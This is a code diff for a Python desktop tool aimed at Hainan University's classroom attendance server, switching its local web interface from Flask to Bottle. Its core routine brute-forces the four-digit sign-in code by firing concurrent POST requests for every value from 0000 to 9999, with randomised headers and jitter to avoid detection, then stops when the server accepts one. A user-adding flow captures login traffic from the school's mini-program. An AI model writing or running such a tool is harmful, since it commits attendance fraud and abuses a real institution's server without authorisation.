@@ -27,7 +27,6 @@ import payLoadsUtils
 import signUtils
 import getStuInfo
 import studentInfo
-from flask import Flask, render_template, request, jsonify
 from datetime import datetime
 import webview
 import json
@@ -40,6 +39,8 @@ import ctypes
 import atexit
 import logging
 import os
+
+from bottle import Bottle, request, response, template, static_file, post, get, run, TEMPLATE_PATH
 
 serverUrl = "https://ktkq.hainanu.edu.cn/app"
 
@@ -62,7 +63,13 @@ stop_event = asyncio.Event()
 exploit_token = "000000"
 did_adding_users = False
 
-app = Flask(__name__, template_folder=signUtils.resource_path('templates'))
+app = Bottle()
+base_dir = os.path.dirname(os.path.abspath(__file__))
+templates_dir = os.path.join(base_dir, 'templates')
+if templates_dir not in TEMPLATE_PATH:
+    TEMPLATE_PATH.insert(0, templates_dir)
+def render_tpl(name, **kwargs):
+    return template(name, **kwargs)
 
 def clean_system_proxy():
     if not did_adding_users: return
@@ -129,7 +136,7 @@ async def send_post_request(target_url, payload, session, semaphore, token):
         # 再次检查，防止在排队等待信号量期间触发了停止信号
         if stop_event.is_set():
             return None
-
+        logging.debug(f"do{token}")
         try:
             #随机请求头
             headers = {
@@ -144,19 +151,22 @@ async def send_post_request(target_url, payload, session, semaphore, token):
             payload["timestamp"] = sign[1]
             payload["kl"] = token
             #jitter-随机微小延迟
-            await asyncio.sleep(random.uniform(0.1, 0.5))
-
+            await asyncio.sleep(random.uniform(0.1, 0.4))
+            logging.debug(f"payload:{payload}")
             async with session.post(
                 target_url,
-                json=payload,
+                data=payload,
                 headers=headers,
                 timeout=timeout_secs
             ) as response:
+                logging.debug(f"responsecode:{response.status},{exploit_token}")
+                logging.debug(f"resjson:{await response.json()}")
                 if response.status == 200:
                     # 读取并解析 JSON
                     try:
                         res_json = await response.json()
                         logging.debug(res_json)
+                        logging.debug(f"response:{res_json.get("status")},{exploit_token}")
                         if res_json.get("status") == 1:
                             logging.info(f"\n命中目标！签到码为：{token} 。正在停止后续任务...")
                             exploit_token = token
@@ -209,13 +219,14 @@ async def signWithoutCode(student, classId, location):
     url = serverUrl + "/saveXsQdInfo"
     payload = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],"0000",location)
     exploit_token = "000000"
+    logging.debug("start sign without code")
     # 使用 ClientSession 复用连接池
     async with aiohttp.ClientSession() as session:
         tasks = []
         for i in range(total_requests):
             # 创建任务
             token = str(i).zfill(4)
-            task = asyncio.ensure_future(send_post_request(url, payload, session, semaphore, token))
+            task = asyncio.ensure_future(send_post_request(url, payload.copy(), session, semaphore, token))
             tasks.append(task)
 
         pbar = tqdm(total=total_requests, desc="爆破中")
@@ -229,13 +240,12 @@ async def signWithoutCode(student, classId, location):
 
             # 每完成 20 个请求更新一次 UI，避免频繁调用 JS 导致卡顿
             if count % 20 == 0  or count == total_requests:
-                progress_msg = f"正在尝试: {i}/10000 (当前码: {str(i).zfill(4)})"
+                progress_msg = f"正在尝试: {count}/10000 (当前码: {str(count).zfill(4)})"
                 if main_window:
                     # 调用前端定义的 JS 函数 updateProgressBar
                     main_window.evaluate_js(f"updateProgressBar({count}, {total_requests}, '{progress_msg}')")
 
             if stop_event.is_set() or exploit_token != "000000" or res == "STOPPED":
-                # 命中目标，通知前端成功
                 if main_window:
                     main_window.evaluate_js(
                         f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！签到码为：{exploit_token}')")
@@ -248,16 +258,16 @@ async def signWithoutCode(student, classId, location):
 @app.route('/')
 def index():
     users = studentInfo.get_users().keys()
-    refreshClasses(request.args.get('user', list(users)[0]))
+    refreshClasses(request.query.user if request.query.user else list(users)[0])
 
     now = datetime.now()
     date_str = now.strftime("%Y年%m月%d日")
     time_str = now.strftime("%H:%M:%S")
     week_list = ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"]
     weekday_str = week_list[now.weekday()]
-    return render_template('index.html',all_users=users,current_user=cur_student, schedule=today_schedule, today_date=date_str, today_time=time_str, weekday=weekday_str)
+    return render_tpl('index.html',all_users=users,current_user=cur_student, schedule=today_schedule, today_date=date_str, today_time=time_str, weekday=weekday_str)
 
-@app.route('/signin/<int:course_id>')
+@app.route('/signin/<course_id:int>')
 def signin_page(course_id):
     course = next((item for item in today_schedule if item["id"] == course_id), None)
     if course:
@@ -268,11 +278,11 @@ def signin_page(course_id):
         elif "第一运动" in today_schedule[course_id]["location"]: reloc = "一田"
         elif "第二运动" in today_schedule[course_id]["location"]: reloc = "二田"
 
-        return render_template('signin.html', course=course, locations=payLoadsUtils.location_options.keys(), recommend_loc=reloc)
+        return render_tpl('signin.html', course=course, locations=payLoadsUtils.location_options.keys(), recommend_loc=reloc)
     return "课程未找到", 404
 
 
-@app.route('/do_signin/<int:course_id>', methods=['POST'])
+@app.post('/do_signin/<course_id:int>')
 def do_signin(course_id):
     selected_location = request.form.get('location')
     has_code = request.form.get('has_code')
@@ -294,21 +304,21 @@ def do_signin(course_id):
         status = signWithCode(cur_student, course_id, signin_code, selected_location)
         if status != 1:
             if status == 4:
-                return jsonify({"status": "warning", "message": f"签到失败！签到码错误。"})
-            return jsonify({"status": "error", "message": f"签到失败！错误码：{status}"})
+                return {"status": "warning", "message": f"签到失败！签到码错误。"}
+            return {"status": "error", "message": f"签到失败！错误码：{status}"}
     else:
         try:
             asyncio.run(signWithoutCode(cur_student,course_id, selected_location))
         except Exception:
-            return jsonify({"status": "error", "message": f"签到失败！错误码：7"})
+            return {"status": "error", "message": f"签到失败！错误码：7"}
 
     for course in today_schedule:
         if course["id"] == course_id:
             course["status"] = "已签到"
             break
-    return jsonify({"status": "success", "message": "签到成功！"})
+    return {"status": "success", "message": "签到成功！"}
 
-@app.route('/upload', methods=['POST'])
+@app.post('/upload')
 def receive_data():
     global new_user
     if main_window:
@@ -328,14 +338,14 @@ def receive_data():
         if main_window:
             main_window.evaluate_js("showResult('error', '添加失败', '保存文件时发生错误')")
 
-    return jsonify({"status": "success"})
+    return {"status": "success"}
 
-@app.route('/add_user', methods=['POST'])
+@app.post('/add_user')
 def add_user():
     global new_user, did_adding_users
     data = request.json
     new = data.get('username')
-    if new in studentInfo.get_users().keys(): return jsonify({"status": "error", "message": "用户已存在"}), 400
+    if new in studentInfo.get_users().keys(): return {"status": "error", "message": "用户已存在"}, 400
     did_adding_users = True
     if new:
         logging.info(f"收到新增用户请求: {new}")
@@ -347,8 +357,8 @@ def add_user():
         time.sleep(4.5)
         if main_window:
             main_window.evaluate_js(f"updateLoadingStatus('抓包环境已就绪，请在小程序中点击登录...')")
-        return jsonify({"status": "success", "message": "正在抓包"})
-    return jsonify({"status": "error", "message": "用户名不能为空"}), 400
+        return {"status": "success", "message": "正在抓包"}
+    return {"status": "error", "message": "用户名不能为空"}, 400
 
 def refreshClasses(student):
     global qdkblist, today_schedule, cur_student
@@ -356,25 +366,20 @@ def refreshClasses(student):
     if student == "null" and studentInfo.get_users()[student] == "null":
         ctypes.windll.user32.MessageBoxW(0, "请先添加用户！", "提示", 0)
         return
-    # sign = signUtils.getSignAndTimestamp()
-    # signUtils.sm2_valid(sign[0], signUtils.privateKey, sign[1])
-
     qdkblist = payLoadsUtils.process_GetQdKbList(send_post("getQdKbList", payLoadsUtils.getStudentClassesPayload(student)))
-    ##########没课时用抓包数据测试
-    # with open(signUtils.resource_path("test.json"), "r", encoding="utf-8") as f:
-    #     testjson = json.load(f)
-    # logging.debug(testjson)
-    # qdkblist = payLoadsUtils.process_GetQdKbList(testjson)
     today_schedule = []
 
     for lec in qdkblist:
         lec_info = {"id": qdkblist.index(lec)}
-        isSigned, isSigning, isSignClose, isOnline = False,False,False,False
+        isSigned, isSigning, isSignClose, isOnline, isLate = False,False,False,False,False
         for i in lec:
             if i == "kcMc":
                 lec_info["name"] = lec[i]
             elif i == "xsQdQkMc":
                 if lec[i] == "已签": isSigned = True
+                if lec[i] == "迟到":
+                    isSigned = True
+                    isLate = True
             elif i == "qdQkMc":
                 if lec[i] == "签到中": isSigning = True
                 elif lec[i] == "已结束": isSignClose = True
@@ -391,16 +396,24 @@ def refreshClasses(student):
             lec_info["status"] = "签到未开始"
         elif not isSigned and isSigning:
             lec_info["status"] = "可签到"
-        elif isSigned and isSigning and not isOnline:
+        elif not isLate and isSigned and isSigning and not isOnline:
             lec_info["status"] = "已签(线下)"
-        elif isSigned and isSigning and isOnline:
+        elif not isLate and isSigned and isSigning and isOnline:
             lec_info["status"] = "已签(线上)"
+        elif isLate and isSigned and isSigning and not isOnline:
+            lec_info["status"] = "迟到(线下)"
+        elif isLate and isSigned and isSigning and isOnline:
+            lec_info["status"] = "迟到(线上)"
         elif not isSigned and isSignClose:
             lec_info["status"] = "签到结束(未签)"
-        elif isSigned and isSignClose and not isOnline:
+        elif not isLate and isSigned and isSignClose and not isOnline:
             lec_info["status"] = "签到结束(已签线下)"
-        elif isSigned and isSignClose and isOnline:
+        elif not isLate and isSigned and isSignClose and isOnline:
             lec_info["status"] = "签到结束(已签线上)"
+        elif isLate and isSigned and isSignClose and not isOnline:
+            lec_info["status"] = "签到结束(迟到线下)"
+        elif isLate and isSigned and isSignClose and isOnline:
+            lec_info["status"] = "签到结束(迟到线上)"
         today_schedule.append(lec_info)
     logging.debug("today" + str(today_schedule))
 
@@ -442,3 +455,4 @@ if __name__ == "__main__":
     threading.Thread(target=start_up,kwargs={'port': str(my_port)}, daemon=True).start()
     main_window = webview.create_window('海大课堂考勤Pro Max', f'http://127.0.0.1:{my_port}', width=1000, height=600)
     webview.start()
+
